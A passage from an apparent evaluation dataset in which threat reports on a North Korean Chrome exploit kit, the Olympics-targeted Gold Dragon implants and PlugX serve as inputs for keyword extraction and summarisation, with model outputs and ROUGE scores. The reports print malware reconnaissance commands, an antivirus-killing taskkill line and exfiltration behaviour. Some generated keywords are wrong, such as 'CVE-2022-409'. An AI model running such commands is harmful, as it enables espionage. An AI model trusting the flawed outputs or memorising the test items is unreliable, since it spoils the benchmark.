script collected all available client information such as the user - agent , resolution , etc . and then sent it back to the exploitation server . If a set of unknown requirements were met , the client would be served a [GPE] Chrome RCE exploit and some additional javascript . If the RCE was successful , the javascript would request the next stage referenced within the script as \u201c SBX \u201d , a common acronym for [PERSON] Sandbox [PERSON] Escape . We unfortunately were unable to recover any of the stages that followed the initial RCE.Careful to protect their exploits , the attackers deployed multiple safeguards to make it difficult for security teams to recover any of the stages . These safeguards included : Only serving the iframe at specific times , presumably when they knew an intended target would be visiting the site . In some email campaigns the targets received links with unique IDs . This was potentially used to enforce a [CARDINAL] one - time - click policy for each link and allow the exploit kit to only be served once . The exploit kit would AES encrypt each stage , including the clients \u2019 responses with a session - specific key . Additional stages were not served if the previous stage failed . Although we recovered a [FAC] Chrome [FAC] RCE , we also found evidence where the attackers specifically checked for visitors using [PERSON] Safari on MacOS or Firefox ( on any OS ) , and directed them to specific links on known exploitation servers . We did not recover any patched on [DATE] February [DATE] 14 , which stresses the importance of applying security updates as they become available.4/4", "generated_text": "the exploit kit; Operation Dream Job; Operation AppleJeus; US; news media; cryptocurrency; fintech; campaigns; the attacks; tools; malware; a remote code execution vulnerability; Chrome; CVE-2022-409; January; 2022; the exploit; the attackers; exploits; components; domains; registrars; web hosts; software vendors; campaigns; the campaign; The campaign; a shared supply chain; the exploit kit; tactics; techniques; procedures; overlap.", "ref_text": "<START-1>1. Initial Access - Threat actors send phishing emails with malicious links pretending to be job recruitment messages. 2. Weaponization - The links lead to attacker-controlled sites or compromised legitimate sites hosting hidden iframes that load the exploit kit. 3. Delivery - When targets click the links and visit the sites, the iframes silently trigger the exploit kit in the background. 4. Exploitation - The exploit kit fingerprints the target's browser and OS first. - It then delivers the Chrome exploit (CVE-2022-0609) if the target is on Chrome. - Other exploits may be served if the target is on Safari or Firefox. 5. Installation - If the Chrome exploit is successful, additional JavaScript is loaded to execute the next stage - likely a sandbox escape. 6. Command & Control - The later stages of the exploit kit likely establish command and control to the attacker's infrastructure. 7. Actions on Objectives - The attackers leverage the remote access and persistence gained for espionage and data exfiltration. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.37671232876712324, "gpt3/lexical/rouge_rouge2": 0.09655172413793105, "gpt3/lexical/rouge_rougeL": 0.17808219178082194, "gpt3/lexical/rouge_rougeLsum": 0.17808219178082194, "gpt3_generated_text": ["The Threat Analysis Group has discovered two North Korean government-backed attacker groups exploiting a remote code execution vulnerability in Chrome, known as CVE-2022-0609. The campaigns, known as Operation Dream Job and Operation AppleJeus, targeted US-based organizations in the news media, IT, cryptocurrency, and fintech industries. These groups may work for the same entity and have access to the same exploit kit. The campaigns used tactics such as sending fake job opportunity emails and compromising legitimate websites to distribute the exploit kit. The exploit kit contained multiple stages and components, making it difficult for security teams to recover them. The attackers deployed safeguards such as serving the exploit kit at specific times and enforcing a one-time-click policy for each link. The exploit was patched on February 14, 2022."]}, {"split_name": "val", "sample_id": "val_18", "prompt_text": "Extract the keywords: ( url\uf002\uf0e1\uf09a\uf099 \uf0d5 \uf09eGold Dragon Widens [EVENT] Olympics [EVENT] Malware [EVENT] Attacks , Gains Permanent Presence on [NORP] Victims \u2019 [PERSON] SystemsBy [PERSON] Ryan [PERSON] Sherstobito   ( url / ) and [PERSON] Jessica Saavedra - Morales ( url on [DATE] Feb 02 , [DATE] 2018 ( url [ORG] Advanced [ORG] Threat [ORG] Research ( [ORG] ATR ) recently released a report ( url labs / malicious - document - targets - pyeongchang - olympics/ ) describing a   leless attack targeting organizations involved with [EVENT] the [EVENT] Pyeongchang [EVENT] Olympics . The attack used a [ORG] PowerShell implant that established a channel to the attacker \u2019s server to gather basic system - level data . What was not determined at that time was what occurred after the attacker gained access to the victim \u2019s system . [ORG] McAfee [ORG] ATR has now discovered additional implants that are part of an operation to gain persistence for continued data ex ltration and for targeted access . We have named these implants , which appeared in [DATE] December [DATE] 2017 , Gold Dragon , [PERSON] Brave [PERSON] Prince , [ORG] Ghost419 , and [PERSON] Running [PERSON] Rat , based on phrases in their code . On [DATE] December [DATE] 24 , [DATE] 2017 , our analysts observed the [NORP] Korean - language implant Gold Dragon . We now believe this implant is the [ORDINAL] second - stage payload in the [EVENT] Olympics attack that [ORG] ATR discovered [DATE] January 6 , [DATE] 2018 . The [ORG] PowerShell implant used in the [EVENT] Olympics campaign was a stager based on the PowerShell Empire framework that created an encrypted channel to the attacker \u2019s server . However , this implant required additional modules to be executed to be a fully capable backdoor . In addition , the [ORG] PowerShell implant did not contain a mechanism to persist beyond a simple scheduled task . Gold Dragon has a much more robust persistence mechanism than the initial [ORG] PowerShell implant and enables the attacker to do much more to the target system . Gold Dragon reappeared [DATE] the [DATE] same [DATE] day that the [EVENT] Olympics campaign began . The Gold Dragon malware appears to have expanded capabilities for pro ling a target \u2019s system and sending the results to a control server . The [ORG] PowerShell implant had only basic data - gathering capabilities \u2014 such as username , domain , machine name , and network con guration \u2014 which are useful only for identifying interesting victims and launching more complex malware against them . Gold DragonGold Dragon is a data - gathering implant observed in the wild since [DATE] December [DATE] 24 . Gold Dragon gets its name from the hardcoded domain www.golddragon.com , which we found throughout the samples . This sample acts as a reconnaissance tool and downloader for subsequent payloads of the malware infection and payload chain . Apart from downloading and executing binaries from the control server , Gold Dragon generates a key to encrypt data that the implant obtains from the system . This URL is not used for control ; the encrypted data is sent to the server ink.inkboom.co.kr , which was used by previous implants [DATE] as [DATE] early [DATE] as [DATE] May [DATE] 2017.Gold [ORG] Dragon contains elements , code , and similar behavior to implants [ORG] Ghost419 and [PERSON] Brave [PERSON] Prince , which we have tracked since [DATE] May [DATE] 2017 . A [ORG] DLL - based implant created on [DATE] December [DATE] 21 ( the same day the   rst malicious [EVENT] Olympics document appeared ) was downloaded by a Gold Dragon variant created [DATE] December [DATE] 24 . This variant was created [DATE] three [DATE] days before the targeted spear phishing email with the [ORDINAL] second document that was sent to [CARDINAL] 333 victim organizations . The [DATE] December [DATE] 24 variant of Gold Dragon used the control server nid-help-pchange.atwebpages.com , which was also used by a Brave Prince variant from [DATE] December [DATE] 21.The   rst variants of Gold Dragon appeared in the wild in [GPE] South [GPE] Korea in [DATE] July [DATE] 2017 . The original [PERSON] Gold [PERSON] Dragon had the   le name .exe , which translates as [ORG] Hangul [ORG] Extraction and was seen exclusively in [GPE] South [GPE] Korea . [CARDINAL] Five variants of Gold Dragon compiled [DATE] December [DATE] 24 appeared heavily during the targeting of the [EVENT] Olympics organizations . Analyzing Gold DragonAs part of its initialization , Gold Dragon : Builds its imports by dynamically loading multiple APIs from multiple libraries [PERSON] Gains debug privileges ( \u201c SeDebugPrivilege \u201d ) for its own process to read remote memory residing in other processesThe malware does not establish persistence for itself but for another component ( if it is found ) on the system : The malware begins by looking for an instance of the Hangul word processor ( [ORG] HWP ) running on the system . ( [ORG] HWP is a [NORP] Korean word processor similar to [ORG] Microsoft [ORG] Word.)Checking for HWP.exe in the process list . If HWP.exe is found running on the system , the malware   nds the currently open   le in [ORG] HWP by extracting the   le path from the command - line argument passed to HWP.exe This word   le ( usually named * .hwp ) is copied into the temporary   le pathC:\\DOCUME~1\\<username>\\LOCALS~1\\Temp\\2.hwphwp is an exact copy of the   le loaded into HWP.exe The malware reads the contents of [CARDINAL] 2.hwp and   nds an \u201c MZ magic marker \u201d in the   le indicated by the string \u201c JOYBERTM\u201dChecking for the [ORG] MZ marker in the [ORG] HWP   le . This marker indicates the presence of an encrypted [GPE] MZ marker in the .hwp   le and is decrypted by the malware and written to the [PRODUCT] Startup folder for the user : C:\\Documents and [PERSON] Settings\\<username>\\Start Menu\\Programs\\Startup\\viso.exeThis step establishes the persistence of the malware across reboots on the endpoint Once the decrypted [ORG] MZ marker is written to the [PRODUCT] Startup folder , the 2.hwp is deleted from the endpointThe malware might perform this activity for a couple of reasons : [NORP] Establish persistence for itself on the endpoint [NORP] Establish persistence of another component of the malware on the endpoint [ORG] Update itself on endpoint after a separate updater component downloads the update from the control serverThe malware has limited reconnaissance and data - gathering capabilities and is not full- edged spyware . Any information gathered from the endpoint is   rst stored in the following   le , encrypted , and sent to the control server : C:\\DOCUME~1\\<username>\\APPLIC~1\\MICROS~1\\HNC\\1.hwpThe following information is gathered from the endpoint , stored in the   le [CARDINAL] 1.hwp , and sent to the control server : Directory listing of the user \u2019s Desktop folder using command : cmd.exe /c dir C:\\DOCUME~1\\<username>\\Desktop\\ > > C:\\DOCUME~1\\<username>\\APPLIC~1\\MICROS~1\\HNC\\1.hwpDirectory listing of the user \u2019s recently accessed   les using command : cmd.exe /c dir C:\\DOCUME~1\\<username>\\Recent > > C:\\DOCUME~1\\<username>\\APPLIC~1\\MICROS~1\\HNC\\1.hwpDirectory listing of the system [PERCENT] \u2019s [PERCENT] % program [ORG] les% folder using command : cmd.exe /c dir C:\\PROGRA~1\\ > > C:\\DOCUME~1\\<username>\\APPLIC~1\\MICROS~1\\HNC\\1.hwpSysteminfo of the endpoint using command : cmd.exe /c systeminfo > > C:\\DOCUME~1\\<username>\\APPLIC~1\\MICROS~1\\HNC\\1.hwpCopies the   le [PERSON] ixe000.bin from : C:\\Documents and Settings\\<username>\\Application Data\\Microsoft\\Windows\\UserPro les\\ixe000.binTo : C:\\DOCUME~1\\<username>\\APPLIC~1\\MICROS~1\\HNC\\1.hwpRegistry key and value information for the current user \u2019s Run key ( with information collected):HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunNumber of subkeys(<KeyIndex > ) < KeyName > Number of Values under each key including the parent [PERSON] Run key(<ValueIndex > ) < Value_Name > < Value_Content > Registry Run key enumeration by [PERSON] Gold [PERSON] Dragon . An example of [CARDINAL] 1.hwp with registry and system information : Gold Dragon executes these steps executed in the ex ltration process : Once the malware has gathered the required data from the endpoint , it encrypts the data   le [CARDINAL] 1.hwp using the password \u201c www[dot]GoldDragon[dot]com \u201d The encrypted content is written to the data   le [CARDINAL] 1.hwp . During the ex ltration process , the malware Base64 - encodes the encrypted data and sends it to its control server using an [ORG] HTTP [ORG] POST request to the URL : url data / parameters used in the request include : Content - Type : multipart / form - data ; boundary=\u2014-WebKitFormBoundar ywhpFxMBe19cSjFnG < followed by base64 encoded [ORG] & encrypted system info > User Agent : [PERSON] Mozilla/4.0 ( compatible ; [ORG] MSIE [ORG] 8.0 ; [EVENT] Windows [EVENT] NT [EVENT] 6.1 ; Trident/4.0 ; .NET CLR 1.1.4322 ) Accept - Language : en - us HTTP Version : HTTP/1.0The malware can also download and execute additional components served to it by the control server . The mechanism for downloading additional components is based on [ORG] the [ORG] Computer [ORG] Name and [PRODUCT] UserName of the endpoint provided by the malware process to the control server in the following HTTP GET request : GET url lename= < Computer_Name>_<username>&continue = dnsadminAfter successfully retrieving the component from the control server , the next - stage payload is copied to the [ORG] Application [ORG] Data directory of the current user and executed : C:\\DOCUME~1\\<username>\\APPLIC~1\\MICROS~1\\HNC\\hupdate.ex(note \u201c ex , \u201d not \u201c exe\u201d)The capability to download additional components from the control server . The malware demonstrates its evasive behavior by checking for the presence of speci c processes related to antimalware products : The presence of any process with the keywords \u201c v3 \u201d and \u201c cleaner . \u201dChecking for antimalware or cleaner processes . If found , these processes are terminated by sending a [GPE] WM_CLOSE message to their windowing threads . Terminating an antimalware / cleaner process . [PERSON] Brave [PERSON] PrinceBrave [PERSON] Prince is a [NORP] Korean - language implant that contains similar code and behavior to the Gold Dragon variants , speci cally the system pro ling and control server communication mechanism . The malware gathers detailed logs about the victim \u2019s con guration , contents of the hard drive , registry , scheduled tasks , running processes , and more . [PERSON] Brave [PERSON] Prince was   rst observed in the wild [DATE] December 13 , [DATE] 2017 , sending logs to the attacker via [GPE] South [GPE] Korea [GPE] \u2019s Daum email service . Later variants posted the data to a web server via an HTTP post command , in the same way that Gold Dragon does . The embedded domain braveprince.com . The Daum variants of [PERSON] Brave [PERSON] Prince gather information from the system and save it to the   le PI_00.dat . This   le is sent as an attachment to the attacker \u2019s email address . Later variants upload the   le to a web server via an HTTP post command . The type of data this implant gathers from the victim \u2019s system : Directories and   les Network con guration Address resolution protocol cache [ORG] Systemcon g to gather tasksBoth variants of [PERSON] Brave [PERSON] Prince can kill a process associated with a tool created by Daum that can block malicious code . This tool is exclusive to [GPE] South [GPE] Korea.taskkill /f /im daumcleaner.exeThe later variants of [PERSON] Brave [PERSON] Prince include the following hardcoded strings : c:\\utils\\c2ae_uiproxy.exe [ORG] c:\\users\\sales\\appdata\\local\\temp\\dwrrypm.dlGhost419Ghost419 is a [NORP] Korean - language implant that   rst appeared in the wild [DATE] December 18 , [DATE] 2017 , with the most recent sample appearing [DATE] two [DATE] days before the [EVENT] Olympics spear phishing email . The malware can be identi ed by the hardcoded string and URL parameter passed to the control server . Ghost419 can be traced to a sample created [DATE] July 29 , [DATE] 2017 , that appears to be a much earlier version ( without the hardcoded identi er ) . The [DATE] July version shares 46 [PERCENT] % of its code with samples created in [DATE] late [DATE] December . This early version implant creates a unique mutex value ( kjie23948_34238958_KJ238742 ) that also appears in a sample from [DATE] December , with the exception that one digit has changed . [ORG] Ghost419 is based on Gold Dragon and [PERSON] Brave [PERSON] Prince implants and contains shared elements and code , especially for system reconnaissance functions . Hardcoded \u201c Ghost419 \u201d in the malware binary . The string \u201c WebKitFormBoundarywhpFxMBe19cSjFnG , \u201d part of the upload mechanism , also appears in the Gold Dragon variants of [DATE] late [DATE] December [DATE] 2017.Gold Dragon sample . Ghost419 sample . Numerous other similarities are present in addition to system reconnaissance methods ; the communication mechanism uses the same user agent string as Gold Dragon . Gold Dragon user agent string . [ORG] Ghost419 user agent string . RunningRatRunningRat is a remote access [PERSON] Trojan ( RAT ) that operates with [CARDINAL] two DLLs . It gets its name from a hardcoded string embedded in the malware . Upon being dropped onto a system , the   rst [ORG] DLL executes . This [ORG] DLL serves [CARDINAL] three main functions : killing antimalware , unpacking and executing the main RAT [ORG] DLL , and obtaining persistence . The malware drops the Windows batch   le [ORG] dx.bat , which attempts to kill the task daumcleaner.exe ; a [NORP] Korean security program . The batch   le then attempts to remove itself . The   rst [ORG] DLL unpacks a resource   le attached to the [ORG] DLL using a zlib decompression algorithm . The authors of the malware left the debugging strings in the binary , making the algorithm easy to identify . The [ORDINAL] second [ORG] DLL is decompressed in memory and never touches the user \u2019s   le system ; this   le is the main RAT that executes . Finally , the   rst [ORG] DLL adds the registry key \u201c SysRat , \u201d at SoftWare\\Microsoft\\Windows\\CurrentVersion\\Run , to ensure the malware is executed at startup . After the [ORDINAL] second [ORG] DLL is loaded into memory , the   rst [ORG] DLL overwrites the [ORG] IP address for the control server , e ectively version , and driver and processor information . The malware initiates its main function of capturing user keystrokes and sending them to the control server using standard Windows networking APIs . From our analysis , stealing keystrokes is the main function of [ORG] RunningRat ; however , the [ORG] DLL has code for more extensive functionality . Code is included to copy the clipboard , delete   les , compress   les , clear event logs , shut down the machine , and much more . However , our current analysis shows no way for such code to be executed . [ORG] McAfee [ORG] ATR analysts will continue to research [ORG] RunningRat to determine if this extra code is used or is possibly left over from a larger RAT toolkit . The [ORDINAL] second [ORG] DLL employs a few additional antidebugging techniques . [CARDINAL] One is the use of a custom exception handler and code paths that are designed to generate exceptions . There are also a few random empty - nested threads to slow down researchers during static analysis . The   nal antidebugging technique involves GetTickCount performance counters , which are placed within the main sections of code to detect any delay a debugger adds during runtime . ConclusionThe PowerShell script   rst discovered by [ORG] McAfee [ORG] ATR was delivered via a spear phishing campaign that used image stenography techniques to hide the   rst - stage implant . ( For more on steganography , see [ORG] the [ORG] McAfee [ORG] Labs [ORG] Threats [ORG] Report , [DATE] June [DATE] 2017 , ( url page 33.)The implants covered in this research establish a permanent presence on the victim \u2019s system once the [ORG] PowerShell implant is executed . The implants are delivered as a [ORDINAL] second stage once the attacker gains an initial foothold using   leless malware . Some of the implants will maintain their persistence only if [PERSON] Hangul [PERSON] Word , which is speci c to [GPE] South [GPE] Korea , is running . With the discovery of these implants , we now have a better understanding of the scope of this operation . Gold Dragon , [PERSON] Brave [PERSON] Prince , [ORG] Ghost419 , and [ORG] RunningRat demonstrate a much wider campaign than previously known . The persistent data ex ltration we see from these implants could give the attacker a potential advantage during the [EVENT] Olympics . We thank [PERSON] Charles [PERSON] Crawford and [PERSON] Asheer [PERSON] Malhotra for their support of this analysis . Indicators of CompromiseIPs194.70.136Domains000webhostapp.com nid-help-pchange.atwebpages.com inkboom.co.kr \uf02c Tags : advanced persistent threats ( url cybersecurity ( url endpoint protection ( url malware ( url a replyFacebook [WORK_OF_ART] Comments ( 0 ) Comments ( 0 ) [PERSON] G+ [PERSON] Comments 0 [ORG] CommentsAdd a comment [ORG] Facebook [ORG] Comments [ORG] PluginSort [ORG] byOldest", "generated_text": "the report; Advanced Threat Research; ATR; a leless attack; organizations; the Pyeongchang Olympics; the attack; a PowerShell implant; a channel; the attacker\u2019s server; basic system-level data; The implant; additional modules; a fully capable backdoor; The PowerShell implant; the attacker; continued data ex ltration; the victim; the same day; the Olympics campaign; the second-stage payload; the second-stage implant; the same day; November 2017; 333; July 2017; a DLL-based implant; DLL; a key; encrypts data; the implant; detection; the malware; the DLL; the operation; persistence; additional malware; part; an operation; persistence; continued data ex ltration; targeted access; the implant; 20; 2022; July 2017; a key; the attack; the attacker; the victim; the track; a DLL; a DLL; a C2; each implant; code; a network connection; the attacker; a network connection; network con guration; a payment card; the user; the system; additional", "ref_text": "<START-1>The document discusses malware campaigns targeting organizations involved with the 2018 Pyeongchang Winter Olympics. Security researchers at McAfee uncovered new malware implants associated with intrusion activity that began in December 2017 with a PowerShell implant delivering basic system information to the attackers. The new implants discovered include: Gold Dragon - Gathers system information and profiles the victim system. It establishes persistence on machines running the Korean word processor Hangul. Brave Prince - Korean-language implant that profiles system config and contents. Exfiltrates data via email and HTTP posts. Ghost419 - Based on Gold Dragon and Brave Prince. Gathers system reconnaissance information. RunningRat - Remote access Trojan that captures keystrokes and exfiltrates them. Contains additional unused functionality. The tactics, techniques, and infrastructure analysis indicates these new implants are part of the same intrusion set that targeted the Olympics with the initial PowerShell implant. The expanded capabilities enable long-term persistence and data exfiltration from victim networks. The implants demonstrate anti-analysis and anti-forensics techniques. The campaign establishes permanent system access exploiting the high profile nature of the Olympics. McAfee assesses with high confidence the activity is part of a nation-state sponsored cyber espionage operation. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4937027707808564, "gpt3/lexical/rouge_rouge2": 0.13670886075949368, "gpt3/lexical/rouge_rougeL": 0.2367758186397985, "gpt3/lexical/rouge_rougeLsum": 0.2367758186397985, "gpt3_generated_text": ["In a recent report by McAfee's Advanced Threat Research (ATR), it was revealed that a leless attack targeted organizations involved with the Pyeongchang Olympics. The attack used a PowerShell implant to establish a channel to the attacker's server and gather basic system-level data. However, what happened after the attacker gained access to the victim's system was unknown at the time. ATR has now discovered additional implants, named Gold Dragon, Brave Prince, Ghost419, and Running Rat, that are part of an operation to gain persistence for continued data extraction and targeted access. The Gold Dragon implant, which appeared on December 24, 2017, is believed to be the second-stage payload in the Olympics attack. Unlike the initial PowerShell implant, Gold Dragon has a more robust persistence mechanism and expanded capabilities for profiling a target's system. It is used as a reconnaissance tool and downloader for subsequent payloads of the malware infection. Gold Dragon shares similarities with other implants, such as Ghost419 and Brave Prince, which have been tracked since May 2017. The article also provides details about the behavior and analysis of Gold Dragon. Overall, this new information highlights the ongoing and sophisticated nature of the malware attack targeting the Pyeongchang Olympics."]}, {"split_name": "val", "sample_id": "val_19", "prompt_text": "Extract the keywords: www.secureworks.com /blog / bronze - president - targets - government - officials [ORG] BRONZE PRESIDENT Targets Government Officials Counter Threat Unit Research Team \u22ee \u22ee [CARDINAL] 9/8/2022The likely [NORP] Chinese government - sponsored threat group uses decoy documents and PlugX malware to compromise targets . [DATE] Thursday , [DATE] September [DATE] 8 , [DATE] 2022 By : [ORG] Counter [ORG] Threat [ORG] Unit [ORG] Research TeamIn June and [DATE] July [DATE] 2022 , Secureworks \u00ae [ORG] Counter [ORG] Threat [ORG] Unit \u2122 ( CTU ) researchers identified a [LOC] PlugX malware campaign targeting computers belonging to government officials of several countries in [LOC] Europe , [LOC] the [LOC] Middle [LOC] East , and [LOC] South [LOC] America . PlugX is modular malware that contacts a command and control ( C2 ) server for tasking and can download additional plugins to enhance its capability beyond basic information gathering . Several characteristics of this campaign indicate that it was conducted by the likely [NORP] Chinese government - sponsored [ORG] BRONZE PRESIDENT threat group , including the use of PlugX , file paths and naming schemes previously used by the threat group , the presence of shellcode in executable file headers , and politically - themed decoy documents that align with regions where [GPE] China has interests . The malware is embedded within [ORG] RAR archive files . Opening the archive on a [PRODUCT] Windows computer with default settings displays a [PRODUCT] Windows shortcut ( [ORG] LNK ) file ( see Figure [CARDINAL] 1 ) that masquerades as a document . Figure [CARDINAL] 1 . Content of RAR archive file . ( Source : Secureworks)Alongside the shortcut is a hidden folder that contains the malware , embedded [CARDINAL] eight levels deep in a sequence of hidden folders named with special characters ( see Figure [CARDINAL] 2 ) . This tiering is likely to bypass mail - scanning products that may not traverse the entire path when scanning content , suggesting that the delivery mechanism was phishing emails , as there is no other benefit to creating such a folder structure.1/11Figure [CARDINAL] 2 . Malicious files contained within hidden folder . ( Source : Secureworks)To execute the malware , the recipient must click the [PRODUCT] Windows shortcut file . The shortcut executes a renamed legitimate file contained in the [ORDINAL] eighth hidden folder . Alongside the legitimate file is a malicious [ORG] DLL and an encrypted payload file . CTU \u2122 researchers observed the malicious payload using the folder names and filenames in [LAW] Table [LAW] 1.Shortcut fileHidden folder`HU proposals to the draft EUCO conclusions.pdf.lnk ` [WORK_OF_ART] Embassy [WORK_OF_ART] of [WORK_OF_ART] the [WORK_OF_ART] Republic [WORK_OF_ART] of [WORK_OF_ART] Suriname [WORK_OF_ART] 2022 - N- 033.pdf.lnk [PERSON] Predlog termina zvanicne ministara i ministarke vanjskih poslova BiH.pdf.lnk [ORG] EL Non - [ORG] Paper [ORG] Pandemic [ORG] Resilience final.docx.lnk [CARDINAL] 313615_MONTENEGRO- [DATE] 2021 - HUMAN - RIGHTS- REPORT.pdf.lnk EU 31st session of [ORG] the [ORG] Commission [ORG] on [ORG] Crime [ORG] Prevention [ORG] and [ORG] Criminal [ORG] Justice [ORG] United [ORG] Nations [ORG] on [ORG] Drugs [ORG] and [ORG] Crime.pdf.lnk [ORG] NV 309 - 2022 HMA 's departure.pdf.lnk`#####_#Legitimate binary [ORG] Opera.exe ( renamed test.tmp ) [ORG] Opera.exe ( renamed mail.tmp)Malicious DLLEncryptedPlugX payloadopera_browser.dll operaDB.datopera_browser.dll operaDB.datOpera.exe ( renamed test.bpl)opera_browser.dll operaDB.datAdobe [ORG] Stock [ORG] Photos Cs3.exe ( renamed ( renamed winrar.chm)Adobe_Caps.dll AdobePlugin.datGoopdate.dllAvastDB.datAvastBrowserUpdate.exe ( renamed chrom.uce)Goopdate.dllAvastDB.datOpera.exe ( renamed test.chm)opera_browser.dll operaDB.datTable [CARDINAL] 1 . Filenames used in PlugX campaign . The legitimate binary files are vulnerable to [ORG] DLL search order hijacking . When executed , they import the malicious [ORG] DLL that loads , decrypts , and executes the payload file . In each sample analyzed by CTU2/11researchers , the shortcut file metadata indicates the file was created on a [PRODUCT] Windows system either with hostname \" desktop - n2v1smh \" or \" desktop - cb248vr\" . Once running , the payload drops a decoy document to the logged - on user 's % Temp% directory and copies the [CARDINAL] three files to a [ORG] ProgramData subdirectory using the pattern \" < Application><3 characters > \" ( e.g. , Operavng ) ( see Figure [CARDINAL] 3 ) . This naming scheme has been used in previous [ORG] BRONZE PRESIDENT PlugX campaigns . CTU researchers observed that when the payload performs the copy operation , it names the legitimate executable with its usual name ( e.g. , [ORG] Opera.exe , AdobePlugin.exe , AvastBrowser.exe).Figure [CARDINAL] 3 . PlugX files copied to [ORG] ProgramData subdirectory . ( Source : Secureworks)The political nature of the decoy documents suggests that the government officials of various countries are targets for [ORG] BRONZE PRESIDENT 's intelligence collection efforts ( see Figures 4 , 5 , and [CARDINAL] 6 ) . The threat group consistently targets [GPE] China 's neighbors such as [GPE] Myanmar and [GPE] Vietnam . However , its collection requirements can change quickly and are often driven by geopolitical events such as the war in [GPE] Ukraine . Figure [CARDINAL] 4 . Decoy document used by [ORG] BRONZE PRESIDENT . ( Source : Secureworks)3/11Figure [CARDINAL] 5 . Decoy document used by [ORG] BRONZE PRESIDENT . ( Source : Secureworks)Figure [CARDINAL] 6 . Decoy document used by [ORG] BRONZE PRESIDENT . ( Source : Secureworks)PlugX sets up persistence on the host by setting a registry [PERSON] Run key ( see Figure 7).Figure [CARDINAL] 7 . PlugX registry configuration . ( Source : [PERSON] Secureworks)4/11The running instance of the PlugX payload executes the copy of the legitimate file under [PRODUCT] ProgramData , passing it a command - line argument before exiting ( see Figure [CARDINAL] 8) . Passing command - line arguments lets the malware adapt its execution based on its execution location . CTU researchers observed this tactic in previous [ORG] BRONZE PRESIDENT PlugX campaigns . Once running , the legitimate file again imports the malicious [ORG] DLL in the same folder , loading , decoding , and passing execution to the malicious payload file . Figure [CARDINAL] 8 . PlugX process execution with command - line argument . ( Source : Secureworks)The payload file calls GetCommandLineW to check the number of arguments . If an additional argument follows the file path , the malware opens the decoy document previously dropped to the user 's % Temp% folder and continues execution with its C2 routine . The malicious DLLs and payloads are heavily obfuscated to hinder analysis and to reduce the likelihood of detection by host - based security software . The malicious [ORG] DLL executes its payload using an unusual technique . Instead of using a call or jmp instruction , it [ORDINAL] first decodes and copies the payload to a new allocation of memory and then makes a call to EnumThreadWindows to pass execution to the start of the malicious payload file ( see Figure [CARDINAL] 9).Figure [CARDINAL] 9 . Malicious [ORG] DLL calling EnumThreadWindows . ( Source : Secureworks)The start of the payload file is treated as executable code in the same way as a Cobalt Strike stageless payload artifact . This could be a tactic developed by [ORG] BRONZE PRESIDENT to increase the likelihood of its malware being misidentified as the popular Cobalt Strike tool . The payload resolves various required Windows functions . It then starts a new thread that makes repeated calls to CheckRemoteDebuggerPresent , exiting if it detects a debugger . Figure [CARDINAL] 10 shows the payload preparing to decode its configuration . The values pushed to the stack are key length , key , data length , and data address . The key is used as a multibyte XOR value . All observed key value lengths are [CARDINAL] nine bytes , and their values vary across samples.5/11Figure [CARDINAL] 10 . PlugX calling its configuration decode function . ( Source : Secureworks)Figure [CARDINAL] 11 shows the beginning of the decoded configuration , including the installation directory , mutex name , and the name of the decoy document associated with the sample . Figure [CARDINAL] 11 . PlugX configuration data . ( Source : Secureworks)BRONZE PRESIDENT has demonstrated an ability to pivot quickly for new intelligence collection opportunities . Organizations in geographic regions of interest to [GPE] China should closely monitor this group 's activities , especially organizations associated with or operating as government agencies . To mitigate exposure to this malware , CTU researchers recommend that organizations use available controls to review and restrict access using the indicators listed in [LAW] Table [LAW] 2 . Note that [ORG] IP addresses can be reallocated . The [ORG] IP addresses may contain malicious content , so consider the risks before opening them hashMalicious RAR file containing [LOC] PlugX ( [PERSON] Predlog termina zvanicne posjete zamjenice predsjedavajuceg [PERSON] Vijeca ministara i ministarke vanjskih poslova BiH.rar ) Malicious [ORG] RAR file containing [LOC] PlugX ( [PERSON] Predlog termina zvanicne posjete zamjenice predsjedavajuceg [PERSON] Vijeca ministara i ministarke vanjskih poslova BiH.rar ) Malicious [ORG] RAR file containing [LOC] PlugX ( [PERSON] Predlog termina zvanicne posjete zamjenice predsjedavajuceg [PERSON] Vijeca ministara i ministarke vanjskih poslova BiH.rar ) Malicious shortcut file that executes [LOC] PlugX ( [PERSON] Predlog termina zvanicne posjete zamjenice predsjedavajuceg [PERSON] Vijeca ministara i ministarke hashMalicious shortcut file that executes [LOC] PlugX ( [PERSON] Predlog termina zvanicne posjete zamjenice predsjedavajuceg [PERSON] Vijeca ministara i ministarke vanjskih poslova BiH.pdf.lnk ) Malicious shortcut file that executes [LOC] PlugX ( [PERSON] Predlog termina zvanicne posjete zamjenice predsjedavajuceg [PERSON] Vijeca ministara i ministarke vanjskih poslova BiH.pdf.lnk ) Malicious [ORG] DLL that loads [LOC] PlugX ( opera_browser.dll ) Malicious [ORG] DLL that loads [LOC] PlugX ( opera_browser.dll ) Malicious [ORG] DLL that loads [LOC] PlugX ( opera_browser.dll ) Encrypted PlugX payload ( operaDB.dat)Encrypted PlugX payload ( operaDB.dat)Encrypted PlugX payload ( operaDB.dat ) Malicious [ORG] RAR file containing PlugX ( Embassy of [GPE] the [GPE] Republic [GPE] of [GPE] Suriname [GPE] 2022-N-033.rar ) Malicious [ORG] RAR file containing PlugX ( Embassy of [GPE] the [GPE] Republic [GPE] of [GPE] Suriname [GPE] 2022-N-033.rar ) Malicious [ORG] RAR file containing PlugX ( Embassy of [GPE] the [GPE] Republic [GPE] of [GPE] Suriname [GPE] 2022-N-033.rar ) Malicious shortcut file that executes PlugX ( Embassy of [GPE] the [GPE] Republic [GPE] of [GPE] Suriname [GPE] 2022 - N- 033.pdf.lnk ) Malicious shortcut file that executes PlugX ( Embassy of [GPE] the [GPE] Republic [GPE] of [GPE] Suriname [GPE] 2022 - N- 033.pdf.lnk ) Malicious shortcut file that executes PlugX ( Embassy of [GPE] the [GPE] Republic [GPE] of [GPE] Suriname [GPE] 2022 - N- 033.pdf.lnk ) Malicious [ORG] DLL that loads [LOC] PlugX ( opera_browser.dll ) Malicious [ORG] DLL that loads [LOC] PlugX ( opera_browser.dll ) Malicious [ORG] DLL that loads [LOC] PlugX ( opera_browser.dll ) Encrypted PlugX payload ( operaDB.dat)Encrypted PlugX payload ( operaDB.dat)Encrypted PlugX payload ( operaDB.dat ) Malicious [ORG] RAR file containing PlugX ( [ORG] HU proposals to the draft EUCO conclusions.rar)7/11IndicatorType hashContextMalicious [ORG] RAR file containing PlugX ( [ORG] HU proposals to the draft EUCO conclusions.rar ) Malicious 